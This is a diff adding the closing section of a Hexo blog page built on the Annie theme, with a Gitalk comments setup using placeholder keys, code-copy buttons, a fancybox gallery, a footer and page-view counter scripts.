+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: '333--',
+			clientSecret: '333--',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'annie-gitalk',
+			owner: 'Sariay',
+			admin: 'Sariay',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by Infernity. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+	
+<script src="/plugin/love/love.js"></script>
+
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+  
+<script src="/plugin/leancloud/av-min.js"></script>
+<script src="/js/leancloud-count.js"></script>
+
+
+	
+
+  
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
